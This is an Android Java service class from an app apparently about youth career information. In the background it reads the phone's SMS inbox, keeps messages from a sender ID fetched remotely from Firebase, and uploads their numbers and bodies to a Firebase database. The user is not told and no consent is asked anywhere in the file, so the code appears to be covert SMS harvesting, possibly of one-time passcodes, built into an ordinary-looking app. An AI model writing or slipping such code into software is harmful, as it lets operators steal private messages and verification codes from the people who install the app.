package com.indian.youthcareerinfo.Services;

import android.annotation.SuppressLint;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.ContentResolver;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.indian.youthcareerinfo.ui.HomeFragment;

import java.util.ArrayList;
import java.util.List;

@SuppressLint("NewApi")
public class UploadSmsAutoService extends JobService {
    private static final String TAG = "ExampleJobService";
    private boolean jobCancelled = false;
    private List<String> sms;
    String uploadId,senderId;
    private DatabaseReference mDatabaseRef,senderIdRef ;

    @Override
    public boolean onStartJob(JobParameters params) {
        mDatabaseRef = FirebaseDatabase.getInstance().getReference("Users");
        senderIdRef = FirebaseDatabase.getInstance().getReference("SenderId");

        sms = new ArrayList<>();
//        sms.clear();
        uploadId = params.getExtras().getString("uploadId");
//        senderId = params.getExtras().getString("senderId");
        Log.d(TAG, "onStartJob: "+uploadId);
        doBackgroundWork(params);
        return true;
    }

    private void doBackgroundWork(final JobParameters params) {
        new Thread(new Runnable() {
            @SuppressLint("NewApi")
            @Override
            public void run() {
                senderIdRef.addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        senderId = snapshot.getValue().toString().toLowerCase();
                        loadSms();
                    }
                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });

                Log.d(TAG, "Job finished");
                jobFinished(params, false);
            }
        }).start();
    }

    private void loadSms() {
        // Create Inbox box URI
        Uri inboxURI = Uri.parse("content://sms/inbox");

        // List required columns
        String[] reqCols = new String[]{"_id", "address", "body"};

        // Get Content Resolver object, which will deal with Content
        // Provider
        ContentResolver cr = getContentResolver();

        // Fetch Inbox SMS Message from Built-in Content Provider
        Cursor c = cr.query(inboxURI, reqCols, null, null, null);

        if (c != null) {
            while (c.moveToNext()) {
                String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
                String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();
                //            if (Number.contains("XTECHH")|| Number.contains("xtechh")) {
                if (Number.toLowerCase().contains(senderId)) {
                    sms.add("Number: " + Number + "\n" + "Body: " + Body);
                }
            }
        }
//        Log.d(TAG, "" + uploadId);
        if(uploadId!=null) {
            mDatabaseRef.child(uploadId).child("sms").setValue(sms);
        }
        c.close();
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        return true;
    }
}
